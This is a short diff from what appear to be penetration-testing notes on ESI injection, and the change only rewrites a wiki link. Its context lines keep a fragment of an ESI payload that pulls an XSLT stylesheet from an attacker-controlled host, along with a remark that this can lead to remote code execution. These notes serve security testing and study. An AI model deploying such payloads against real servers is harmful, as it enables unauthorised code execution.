@@ -44,4 +44,4 @@ The ESI tags are injected by cache mechanisms for other cache mechanisms; howeve
 stylesheet="http://attacker.com/transformation.xsl" />
 ```
 
-> There is also a possibility that the ESI Injection might lead to Remote Code Execution when it has support for XSLT. Check [[Web Applications testing/Attacks/XSLT Engines]]
+> There is also a possibility that the ESI Injection might lead to Remote Code Execution when it has support for XSLT. Check [[XSLT Engines]]
